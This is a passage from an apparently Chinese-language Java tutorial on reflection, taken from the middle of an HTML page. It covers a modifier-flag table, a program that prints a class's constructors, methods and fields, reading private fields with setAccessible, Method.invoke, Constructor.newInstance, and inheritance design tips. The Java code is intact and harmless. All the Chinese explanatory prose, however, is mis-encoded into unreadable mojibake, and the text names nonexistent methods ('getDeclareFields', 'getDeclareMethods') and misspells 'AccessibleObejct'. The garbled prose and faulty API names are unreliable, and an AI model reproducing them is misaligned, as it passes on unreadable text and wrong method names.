å™¨çš„åç§°ã€‚</p><p><code>Field</code>ç±»ä¸­æœ‰<code>getType</code>æ–¹æ³•ç”¨æ¥è¿”å›æè¿°å­—æ®µç±»å‹çš„ä¸€ä¸ªå¯¹è±¡ã€‚<code>Method</code>å’Œ<code>Constructor</code>ä¹Ÿæœ‰æŠ¥å‘Šå‚æ•°ç±»å‹çš„æ–¹æ³•ï¼š<code>getParameterTypes</code>ã€‚<code>Method</code>ç±»è¿˜æœ‰ä¸€ä¸ªæŠ¥å‘Šè¿”å›ç±»å‹çš„æ–¹æ³•<code>getReturnType</code>ã€‚</p><p>è¿™ä¸‰ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªåä¸º<code>getModifiers</code>çš„æ–¹æ³•ï¼Œå®ƒå°†è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œç”¨ä¸åŒçš„0&#x2F;1ä½æè¿°æ‰€ä½¿ç”¨çš„ä¿®é¥°ç¬¦ï¼Œå¦‚publicå’Œstaticã€‚è¿˜å¯ä»¥åˆ©ç”¨<code>Modifier.toString</code>æ–¹æ³•å°†ä¿®é¥°ç¬¦æ‰“å°å‡ºæ¥ã€‚</p><table><thead><tr><th>ä¿®é¥°ç¬¦</th><th>å¯¹åº”çš„intç±»å‹</th></tr></thead><tbody><tr><td>public</td><td>1</td></tr><tr><td>private</td><td>2</td></tr><tr><td>protected</td><td>4</td></tr><tr><td>static</td><td>8</td></tr><tr><td>final</td><td>16</td></tr><tr><td>synchronized</td><td>32</td></tr><tr><td>volatile</td><td>64</td></tr><tr><td>transient</td><td>128</td></tr><tr><td>native</td><td>256</td></tr><tr><td>interface</td><td>512</td></tr><tr><td>abstract</td><td>1024</td></tr><tr><td>strict</td><td>2048</td></tr></tbody></table><p><code>Class</code>ç±»ä¸­çš„<code>getFields</code>ã€<code>getMethods</code>å’Œ<code>getConstructors</code>æ–¹æ³•å°†åˆ†åˆ«è¿”å›è¿™ä¸ªç±»æ”¯æŒçš„<strong>å…¬å…±</strong>å­—æ®µã€æ–¹æ³•å’Œæ„é€ å™¨çš„æ•°ç»„ï¼Œå…¶ä¸­åŒ…æ‹¬è¶…ç±»çš„<strong>å…¬å…±</strong>æˆå‘˜ã€‚</p><p><code>Class</code>ç±»çš„<code>getDeclareFields</code>ã€<code>getDeclareMethods</code>å’Œ<code>getDeclaredConstructors</code>æ–¹æ³•å°†åˆ†åˆ«è¿”å›ç±»ä¸­å£°æ˜çš„å…¨éƒ¨å­—æ®µã€æ–¹æ³•å’Œæ„é€ å™¨çš„æ•°ç»„ï¼Œå…¶ä¸­åŒ…æ‹¬ç§æœ‰æˆå‘˜ã€åŒ…æˆå‘˜å’Œå—ä¿æŠ¤æˆå‘˜ï¼Œ<strong>ä½†ä¸åŒ…æ‹¬è¶…ç±»çš„æˆå‘˜</strong> ã€‚</p><p>ä¸‹é¢è¿™ä¸ªç¨‹åºæ˜¾ç¤ºå¦‚ä½•æ‰“å°ä¸€ä¸ªç±»çš„å…¨éƒ¨ä¿¡æ¯ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>javalearn</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Modifier</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectionTest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ReflectiveOperationException</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"com.javalearn.Employee"</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> supercl <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"class "</span> <span class="token operator">+</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>supercl <span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> supercl <span class="token operator">!=</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" extends "</span> <span class="token operator">+</span> supercl<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n&#123;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printConstructors</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printMethods</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printFields</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printConstructors</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cl<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Constructor</span> c<span class="token operator">:</span>constructors<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>paramTypes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>paramTypes<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printMethods</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cl<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m <span class="token operator">:</span>methods<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> retType <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>retType<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>paramTypes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>paramTypes<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printFields</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cl<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Field</span> e<span class="token operator">:</span>fields<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> type <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span> <span class="token operator">+</span> name<span class="token operator">+</span> <span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="ä½¿ç”¨åå°„åœ¨è¿è¡Œæ—¶åˆ†æå¯¹è±¡"><a href="#ä½¿ç”¨åå°„åœ¨è¿è¡Œæ—¶åˆ†æå¯¹è±¡" class="headerlink" title="ä½¿ç”¨åå°„åœ¨è¿è¡Œæ—¶åˆ†æå¯¹è±¡"></a>ä½¿ç”¨åå°„åœ¨è¿è¡Œæ—¶åˆ†æå¯¹è±¡</h4><p>è¦æƒ³æŸ¥çœ‹å­—æ®µçš„å…·ä½“å†…å®¹ï¼Œå…³é”®æ–¹æ³•æ˜¯<code>Field</code>ç±»ä¸­çš„<code>get</code>æ–¹æ³•ã€‚å¦‚æœ<code>f</code>æ˜¯ä¸€ä¸ª<code>Field</code>ç±»å‹çš„å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡<code>getDeclaredFields</code>å¾—åˆ°çš„å¯¹è±¡ï¼‰ï¼Œ<code>obj</code>æ˜¯æŸä¸ªåŒ…å«<code>f</code>å­—æ®µçš„ç±»çš„å¯¹è±¡ï¼Œ<code>f.get(obj)</code>å°†è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶å€¼ä¸º<code>obj</code>çš„å½“å‰å­—æ®µå€¼ã€‚</p><p>æ­¤å¤–ï¼Œ<code>f.set(obj,value)</code>å°†æŠŠå¯¹è±¡<code>obj</code>çš„<code>f</code>è¡¨ç¤ºçš„å­—æ®µè®¾ç½®ä¸ºæ–°å€¼<code>value</code>ã€‚</p><p>ä½†æ˜¯è¿™æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœé‚£ä¸ªå­—æ®µæ˜¯ç§æœ‰å­—æ®µï¼Œ<code>get</code>å’Œ<code>set</code>ä¼šæŠ›å‡ºä¸€ä¸ª<code>IllegalAccessException</code>ã€‚åªèƒ½å¯¹å¯ä»¥è®¿é—®çš„å­—æ®µä½¿ç”¨<code>get</code>å’Œ<code>set</code>æ–¹æ³•ã€‚</p><p>åå°„æœºåˆ¶çš„é»˜è®¤è¡Œä¸ºå—é™äº<code>Java</code>çš„è®¿é—®æ§åˆ¶ã€‚ä¸è¿‡ï¼Œå¯ä»¥è°ƒç”¨<code>Field</code>ã€<code>Method</code>æˆ–<code>Constructor</code>å¯¹è±¡çš„<code>setAccessible</code>æ–¹æ³•è¦†ç›–<code>Java</code>çš„è®¿é—®æ§åˆ¶ï¼š</p><pre class="language-java" data-language="java"><code class="language-java">f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>setAccessible</code>æ–¹æ³•æ˜¯<code>AccessibleObejct</code>ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒæ˜¯<code>Field</code>ã€<code>Method</code>å’Œ<code>Constructor</code>ç±»çš„å…¬å…±è¶…ç±»ã€‚è¿™ä¸ªç‰¹æ€§æ˜¯ä¸ºè°ƒå¼ã€æŒä¹…å­˜å‚¨å’Œç±»ä¼¼æœºåˆ¶æä¾›çš„ã€‚</p><p>æ‰€ä»¥å…·ä½“è·å¾—ä¸€ä¸ªå­—æ®µçš„ä»£ç å¯ä»¥æ˜¯è¿™æ ·ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> feng <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> feng<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> f <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"salary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> v <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>feng<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="è°ƒç”¨ä»»æ„æ–¹æ³•å’Œæ„é€ å™¨"><a href="#è°ƒç”¨ä»»æ„æ–¹æ³•å’Œæ„é€ å™¨" class="headerlink" title="è°ƒç”¨ä»»æ„æ–¹æ³•å’Œæ„é€ å™¨"></a>è°ƒç”¨ä»»æ„æ–¹æ³•å’Œæ„é€ å™¨</h4><p>å¯ä»¥ç”¨<code>Field</code>ç±»çš„<code>get</code>æ–¹æ³•æŸ¥çœ‹ä¸€ä¸ªå¯¹è±¡çš„å­—æ®µã€‚ä¸ä¹‹ç±»ä¼¼ï¼Œ<code>Method</code>ç±»æœ‰ä¸€ä¸ª<code>invoke</code>æ–¹æ³•ï¼Œå…è®¸ä½ è°ƒç”¨åŒ…è£…åœ¨å½“å‰<code>Method</code>å¯¹è±¡ä¸­çš„æ–¹æ³•ã€‚<code>invoke</code>æ–¹æ³•çš„ç­¾åï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> invoke <span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span></code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯éšå¼å‚æ•°ï¼Œå…¶ä½™çš„å¯¹è±¡æä¾›æ˜¾ç¤ºå‚æ•°ã€‚å¯¹äºé™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥å¿½ç•¥ï¼Œå³å¯ä»¥æŠŠå®ƒè®¾ç½®ä¸ºnullã€‚</p><p>å¦‚æœè¿”å›ç±»å‹æ˜¯åŸºæœ¬ç±»å‹ï¼Œ<code>invoke</code>æ–¹æ³•ä¼šè¿”å›å…¶åŒ…è£…å™¨ç±»å‹ã€‚</p><p>æƒ³è¦å¾—åˆ°<code>Method</code>å¯¹è±¡çš„è¯ï¼Œå¯ä»¥è°ƒç”¨<code>getDeclareMethods</code>æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨<code>Class</code>ç±»çš„<code>getMethod</code>æ–¹æ³•æˆ–<code>getDeclaredMethod</code>æ–¹æ³•ã€‚ä¸è¿‡ï¼Œæœ‰å¯èƒ½å­˜åœ¨è‹¥å¹²ä¸ªåŒåçš„æ–¹æ³•ï¼Œå› æ­¤è¦å‡†ç¡®åœ°å¾—åˆ°æƒ³è¦çš„é‚£ä¸ªæ–¹æ³•ï¼Œ<strong>å¿…é¡»æä¾›æƒ³è¦çš„æ–¹æ³•çš„å‚æ•°ç±»å‹</strong>ã€‚<code>getMethod</code>çš„ç­¾åï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Method</span> <span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span></code></pre><p>æ‰€ä»¥å¾—åˆ°é‚£ä¸ªæ–¹æ³•å¯èƒ½è¿˜éœ€è¦æä¾›æ–¹æ³•ç­¾åã€‚ä¹‹åè°ƒç”¨<code>invoke</code>æ–¹æ³•å³å¯è°ƒç”¨ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> method <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>feng<span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„æ–¹æ³•è°ƒç”¨ä»»æ„çš„æ„é€ å™¨ã€‚å°†æ„é€ å™¨çš„å‚æ•°ç±»å‹æä¾›ç»™<code>Class.getConstructor</code>æ–¹æ³•ï¼Œå¹¶æŠŠå‚æ•°å€¼æä¾›ç»™<code>Constructor.newInstance</code>æ–¹æ³•ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> cl  <span class="token operator">=</span> <span class="token class-name">Employee</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> cons <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> obj <span class="token operator">=</span> cons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> feng <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//feng</span></code></pre><h3 id="ç»§æ‰¿çš„è®¾è®¡æŠ€å·§"><a href="#ç»§æ‰¿çš„è®¾è®¡æŠ€å·§" class="headerlink" title="ç»§æ‰¿çš„è®¾è®¡æŠ€å·§"></a>ç»§æ‰¿çš„è®¾è®¡æŠ€å·§</h3><ol><li>å°†å…¬å…±æ“ä½œå’Œå­—æ®µæ”¾åœ¨è¶…ç±»ä¸­ã€‚</li><li>ä¸è¦ä½¿ç”¨å—ä¿æŠ¤çš„å­—æ®µã€‚</li><li>ä½¿ç”¨ç»§æ‰¿å®ç°â€is-aâ€å…³ç³»ã€‚</li><li>é™¤éæ‰€æœ‰ç»§æ‰¿çš„æ–¹æ³•éƒ½æœ‰æ„ä¹‰ï¼Œå¦åˆ™ä¸è¦ä½¿ç”¨ç»§æ‰¿ã€‚</li><li>åœ¨è¦†ç›–æ–¹æ³•æ—¶ï¼Œä¸è¦æ”¹å˜é¢„æœŸçš„è¡Œä¸ºã€‚</li><li>ä½¿ç”¨å¤šæ€ï¼Œè€Œä¸è¦ä½¿ç”¨ç±»å‹ä¿¡æ¯ã€‚</li><li>ä¸è¦æ»¥ç”¨åå°„ã€‚</li></ol><h3 id="æ¥å£"><a href="#æ¥å£" class="headerlink" 